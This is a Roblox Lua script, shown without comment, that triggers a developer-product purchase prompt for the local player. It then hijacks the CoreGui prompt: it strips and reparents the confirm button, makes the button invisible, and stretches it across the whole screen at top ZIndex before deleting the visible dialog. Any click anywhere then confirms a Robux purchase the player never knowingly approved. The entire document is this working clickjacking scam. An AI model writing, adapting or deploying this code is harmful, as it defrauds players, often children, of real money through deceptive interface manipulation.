local MarketplaceService = game:GetService("MarketplaceService")
local Core = game:GetService("CoreGui")
local GamepassID = 2692326944

MarketplaceService:PromptProductPurchase(game.Players.LocalPlayer, GamepassID)

Core:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator").ChildAdded:Connect(function(v)
	if v.Name == "Prompt" then
		local pbutton = v:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("Buttons"):WaitForChild("2")
		for i, g in pairs(pbutton:GetChildren()) do
			g:Destroy()
		end
		pbutton.Parent = Core:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
		pbutton.Image = ""
		pbutton.ZIndex = 9999
		pbutton.Size = UDim2.new(10, 0, 10, 0)
		v:Destroy()
	end
end)